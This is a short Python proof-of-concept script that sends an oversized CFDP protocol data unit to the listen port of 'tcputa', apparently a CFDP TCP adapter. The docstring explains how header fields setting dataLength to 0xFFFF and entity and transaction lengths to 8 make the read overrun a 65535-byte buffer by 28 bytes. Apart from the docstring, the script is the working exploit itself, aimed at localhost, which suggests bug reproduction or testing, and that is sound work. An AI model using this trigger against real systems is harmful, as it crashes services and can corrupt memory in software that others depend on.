#!/usr/bin/env python3
"""Send an oversized CFDP PDU to tcputa's listen port to trigger the buffer
overrun.  header[1..2]=dataLength (0xFFFF), header[3]=0x77 -> entity/txn nibble
7 each -> entityNbrLength=transactionNbrLength=8.  remainingPduLength =
8 + 8 + 8 + 65535 = 65559; with the 4-byte header the read reaches 65563,
28 bytes past the 65535-byte buffer."""
import socket, sys
port = int(sys.argv[1])
header = bytes([0x00, 0xFF, 0xFF, 0x77])   # dataLength=65535, entity=txn=8
remaining = 8 + 8 + 8 + 65535              # 65559
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", port))
s.sendall(header + (b"B" * remaining))
try:
    s.settimeout(3); s.recv(16)
except Exception:
    pass
s.close()
